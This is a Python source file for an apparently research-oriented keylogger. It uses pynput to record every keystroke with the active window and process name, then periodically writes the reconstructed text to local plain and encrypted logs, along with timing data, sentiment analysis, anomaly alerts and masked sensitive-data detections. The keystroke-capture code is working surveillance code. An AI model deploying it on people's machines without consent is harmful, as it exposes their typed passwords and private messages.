from pynput.keyboard import Key, Listener
import threading
import os
import json
import time
from datetime import datetime
from sentiment_analyzer import analyze_sentiment
from anomaly_detector import detect_anomaly
from sensitive_detector import detect_sensitive, mask_sensitive
from extension.context_tracker import get_active_window
from extension.crypto_manager import encrypt_text

log = ""
path = os.path.join(os.getcwd(), "data", "log.txt")
encrypted_path = os.path.join(os.getcwd(), "data", "log.txt.enc")
sentiment_path = os.path.join(os.getcwd(), "data", "sentiments.json")
keystroke_path = os.path.join(os.getcwd(), "data", "keystrokes.json")
alert_path = os.path.join(os.getcwd(), "data", "alerts.json")
sensitive_path = os.path.join(os.getcwd(), "data", "sensitive_detections.json")

os.makedirs(os.path.dirname(path), exist_ok=True)

last_time = None
burst_count = 0
keystroke_buffer = []
last_window = ""

BURST_THRESHOLD = 0.3


def get_key_type(key):
    try:
        key.char
        return "alphanum"
    except AttributeError:
        if key in [Key.up, Key.down, Key.left, Key.right, Key.home, Key.end, Key.page_up, Key.page_down]:
            return "navigation"
        else:
            return "special"


def log_alert(keystroke_entry):
    alert = {
        "timestamp": datetime.now().isoformat(),
        "type": "anomalie_frappe",
        "details": keystroke_entry,
        "message": "Comportement de frappe anormal detecte"
    }

    existing = []
    if os.path.exists(alert_path):
        try:
            with open(alert_path, "r") as f:
                existing = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            existing = []
    existing.append(alert)
    with open(alert_path, "w") as f:
        json.dump(existing, f, indent=2)

    print(f"[ALERTE] {alert['timestamp']} - {alert['message']}")


def processkeys(key):
    global log, last_time, burst_count, keystroke_buffer, last_window

    current_time = time.time()

    if last_time is not None:
        delay = current_time - last_time
    else:
        delay = 0.0

    if delay < BURST_THRESHOLD:
        burst_count += 1
    else:
        burst_count = 1

    key_type = get_key_type(key)

    window_info = get_active_window()
    current_window = window_info["window_title"]

    if current_window != last_window:
        log += f"\n[APP: {window_info['process_name']} - {current_window}]\n"
        last_window = current_window

    keystroke_data = {
        "timestamp": datetime.now().isoformat(),
        "inter_key_delay": round(delay, 4),
        "key_type": key_type,
        "burst_length": burst_count,
        "window_title": window_info["window_title"],
        "process_name": window_info["process_name"]
    }
    keystroke_buffer.append(keystroke_data)

    if detect_anomaly(keystroke_data):
        log_alert(keystroke_data)

    last_time = current_time

    try:
        char = key.char
        if char is not None:
            log += char
    except AttributeError:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        elif key == Key.backspace:
            if len(log) > 0:
                log = log[:-1]


def report():
    global log, keystroke_buffer

    if log:
        detections = detect_sensitive(log)
        sensitive_results = []

        if detections:
            sensitive_results = detections
            masked_log = mask_sensitive(log, detections)
        else:
            masked_log = log

        with open(path, "a", encoding="utf-8") as logfile:
            logfile.write(masked_log)

        encrypted = encrypt_text(masked_log)
        with open(encrypted_path, "ab") as enc_file:
            enc_file.write(encrypted + b"\n")

        if sensitive_results:
            existing_sens = []
            if os.path.exists(sensitive_path):
                try:
                    with open(sensitive_path, "r") as f:
                        existing_sens = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    existing_sens = []
            existing_sens.extend(sensitive_results)
            with open(sensitive_path, "w") as f:
                json.dump(existing_sens, f, indent=2, ensure_ascii=False)

        phrases = log.split("\n")
        sentiments = []
        for phrase in phrases:
            phrase = phrase.strip()
            if phrase and not phrase.startswith("[APP:"):
                result = analyze_sentiment(phrase)
                result["text"] = phrase
                sentiments.append(result)

        if sentiments:
            existing = []
            if os.path.exists(sentiment_path):
                try:
                    with open(sentiment_path, "r") as f:
                        existing = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    existing = []
            existing.extend(sentiments)
            with open(sentiment_path, "w") as f:
                json.dump(existing, f, indent=2, ensure_ascii=False)

        log = ""

    if keystroke_buffer:
        existing_ks = []
        if os.path.exists(keystroke_path):
            try:
                with open(keystroke_path, "r") as f:
                    existing_ks = json.load(f)
            except (json.JSONDecodeError, FileNotFoundError):
                existing_ks = []
        existing_ks.extend(keystroke_buffer)
        with open(keystroke_path, "w") as f:
            json.dump(existing_ks, f, indent=2)
        keystroke_buffer = []

    timer = threading.Timer(10, report)
    timer.daemon = True
    timer.start()


report()

keyboard_listener = Listener(on_press=processkeys)

with keyboard_listener:
    keyboard_listener.join()